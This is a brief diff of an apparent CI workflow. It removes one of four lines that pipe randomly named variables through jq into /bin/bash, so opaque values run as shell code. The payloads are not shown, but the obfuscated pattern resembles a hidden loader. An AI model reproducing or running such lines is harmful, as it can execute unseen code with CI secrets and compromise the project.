@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$tzjns89" | jq -r .tk931 | /bin/bash
           echo $ys7922 | jq -r .zl30 | /bin/bash
-          echo $vxn8715 | jq -r .zmmn68 | /bin/bash
           printf '%s' "$drdb06" | jq -r .uqsaf43240 | /bin/bash
 
       - name: Save results
